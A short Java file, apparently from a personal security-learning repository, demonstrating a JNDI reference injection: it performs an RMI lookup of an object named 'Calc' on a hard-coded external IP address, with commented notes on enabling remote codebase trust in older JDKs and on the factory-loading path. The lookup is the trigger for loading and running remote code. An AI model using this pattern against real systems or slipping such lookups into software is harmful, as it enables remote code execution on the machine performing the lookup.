package com.xjjlearning.hack.java.highjdk;

import com.sun.naming.internal.VersionHelper;

import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import javax.naming.spi.NamingManager;
import java.util.Hashtable;

/**
 * Created by xjj on 2023/3/9.
 */
public class JNDIReference {
    // 8u113之前可以
//    static {
//        System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
//    }
    public static void main(String[] args) throws NamingException {
        Hashtable env = new Hashtable();
        // com.sun.jndi.rmi.registry.RegistryContextFactory 是RMI Registry Service Provider对应的Factory
        env.put(Context.INITIAL_CONTEXT_FACTORY, "com.sun.jndi.rmi.registry.RegistryContextFactory");
        env.put(Context.PROVIDER_URL, "rmi://47.95.7.37:1099");
        Context ctx = new InitialContext(env);
        Object local_obj = ctx.lookup("rmi://47.95.7.37:1099/Calc");

        // 整个类加载逻辑
//        NamingManager.getObjectInstance()

        // 加载工厂的逻辑
//        NamingManager.getObjectFactoryFromReference()

    }
}
